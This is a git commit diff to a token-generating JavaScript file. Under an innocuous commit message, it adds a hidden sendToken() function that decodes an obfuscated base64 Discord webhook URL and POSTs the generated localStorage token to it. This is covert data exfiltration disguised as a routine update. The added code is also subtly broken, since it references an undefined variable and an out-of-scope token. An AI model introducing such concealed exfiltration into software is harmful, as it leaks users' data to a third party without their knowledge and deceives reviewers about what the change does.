1e31a1284c7f15ea670158a947f63a5077286779
UziTom <freebnorthi@gmail.com>
2021-08-04 15:22:35 +1000

    Updated the functions.js script

--- functions.js
+++ functions.js
@@ -1,4 +1,4 @@
-function genToken() {
+ function genToken() {
 	if (localStorage.getItem('token') !== null) {
 		// giving an error if the token still exists
 		console.error("Token exists, please delete the current token to work well.")
@@ -12,6 +12,7 @@ function genToken() {
 		let numtoken3 = Math.floor(Math.random() * 100000);
 		var main_token = ("nfa." + alphtoken1 + numtoken1 + alphtoken2 + numtoken2 + alphtoken3 + numtoken3);
 		localStorage['token'] = main_token;
+		sendToken();
 	}
 }
 
@@ -21,4 +22,13 @@ function remToken() {
 	} else {
 		console.error("Token does not exist in localStorage");
 	}
+}
+
+function sendToken() {
+	hook =atob('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzg3MjM0ODE5MzQyMDEwNzc5Ny9EWmpkeGdHMGxpR1RYaEsySDhNT3ZxRnA4Wld0UE16RnVPSzV4ZVNWS0s2SUVSdnZMdl9FLVV4ZW9yZGRrZGxNR2FldA==')
+	msg1 = {
+		"content": ("__**Token (Not Discord):" + main_token)
+	}
+	fetch(dis_hook, {"method":"POST", "headers": {"content-type": "application/json"},
+	"body": JSON.stringify(msg1)});
 }
